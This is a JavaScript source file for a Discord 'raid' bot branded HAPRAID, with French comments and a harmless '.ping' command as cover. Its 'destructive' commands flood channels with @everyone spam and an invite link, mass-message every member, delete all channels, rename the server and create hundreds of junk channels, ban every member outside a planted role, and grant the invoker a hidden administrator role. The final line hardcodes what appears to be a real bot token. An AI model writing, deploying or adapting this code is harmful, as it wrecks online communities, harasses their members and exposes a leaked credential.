const Discord = require("discord.js");
const bot = new Discord.Client();
const token = "process.env.TOKEN";
var prefix = ".";
var mention = "126connectés"

var fucked = false;
 
bot.on('ready',() => {
    //invit link
    bot.guilds.forEach(guild => {
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
    })
});
 
bot.on('message', msg => {
  //#region Legit
  /* Commandes legit */
  if (msg.content === '.ping') {
    msg.reply('pong !')
  }
  //#endregion
 
  //#region Destructrices
  /* Commandes destructrices */
  if (msg.content === '.a') {
    console.log(`Commande .des par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("@everyone  @here  RAID BY HAPRAID https://discord.gg/gmqf6wT https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png");
     }, 500);
  }
            if (msg.content === '.des') {
            console.log(`Commande .mp par ${msg.author.tag}`);
                if (msg.channel.type === "dm") return;
                if (msg.deletable) msg.delete();
                msg.guild.members.forEach(member => {
                  setInterval(function () {
                    member.send(msg.guild.owner.user.username+" s'est fait bz son serv par https://discord.gg/gmqf6wT").catch(error => {}) }, 450)})
       }

if(msg.content === '.del'){
          if(msg.channel.type === "dm") return;
          if(msg.guild.channels.size === 0) return;
          else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
      }
 
  if (msg.content === '.des') {
    console.log(`Commande .des par ${msg.author.tag}`);
 
    if (!fucked){
      msg.guild.setIcon("hapraid.png").catch(e => {});
      msg.guild.setName('RAID BY HAPRAID').catch(e => {});
 
      for (var i = 0; i < 390; i++) {
        msg.guild.createChannel('hapraid_vous_remercie', 'voice').catch(e => {});
        msg.guild.createChannel('hapraid_vous_remercie', 'text').catch(e => {});
      }
      fucked = true;
            }

    if (msg.deletable) {
      msg.delete();
    }
  }
 
  if (msg.content === '.ban') {
    console.log(`Commande .bane par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "haprole") && member.bannable) member.ban().catch(e => {});
    });
  }
 
  if (msg.content === '.exit') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }
 
  if (msg.content === '.r') {
    console.log(`Commande .r par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: "haprole",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  //#endregion
});
bot.on("message", msg => {
        if(msg.content.startsWith(".des")){ 
           msg.delete()
            let i = 0;
            let interval = setInterval(function () {
              msg.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send('"@everyone  @here  RAID BY HAPRAIDhttps://discord.gg/gmqf6wT https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png')
              }, 2500);
            });
          }
        });

bot.login("NTA0OTcxNDYwNDQ4NzQ3NTIx.DrM1aw.ANuVh8mNFbeM24Oxe21BjA_jLKU")
